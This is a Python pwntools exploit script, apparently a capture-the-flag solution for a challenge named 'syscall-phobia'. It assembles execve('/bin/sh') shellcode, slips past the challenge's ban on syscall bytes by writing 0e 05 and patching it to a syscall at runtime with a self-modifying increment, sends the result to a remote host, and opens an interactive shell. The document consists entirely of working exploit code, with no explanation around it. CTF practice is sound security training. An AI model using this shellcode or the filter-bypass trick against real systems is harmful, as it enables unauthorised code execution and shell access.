from pwn import *
import sys

exe = ELF("./syscall-phobia")
host = "ctf-85ib.balancedcompo.site" 
port = 9998

def exploit(p):
    shellcode = asm(
        "push   0x68;"
        "movabs rax, 0x732f2f2f6e69622f;"
        "push   rax;"
        "mov    rdi, rsp;"
        "push   0x1016972;"
        "xor    DWORD PTR [rsp], 0x1010101;"
        "xor    esi, esi;"
        "push   rsi;"
        "push   0x8;"
        "pop    rsi;"
        "add    rsi, rsp;"
        "push   rsi;"
        "mov    rsi, rsp;"
        "xor    edx, edx;"
        "push   0x3b;"
        "pop    rax;"
        "inc    BYTE PTR [rip];",
        arch = 'amd64', os = 'linux'
    )

    print(disasm(shellcode))
    
    a = ['0x{:02x}'.format(u8(a))[2:] for a in shellcode] # Converting shellcode to hex string
    a += ["0e", "05", "90", "90", "90"] # syscall + a few NOPs
    payload = ''.join(a)

    lg('Payload: ' + payload)
    lg('Payload length: ' + str(len(payload)))
    
    sla('Enter assembly bytecode here! (No syscalls please, tenks): ', payload)

    p.interactive()

if __name__ == "__main__":
    context.binary = exe

    if sys.argv[-1] == "remote":
        p = remote(host, port)
    else:
        p = process([exe.path])
        pause()

    sl = lambda a: p.sendline(a)
    sla = lambda a,b: p.sendlineafter(a,b)
    lg = lambda a : log.info(a)

    exploit(p)
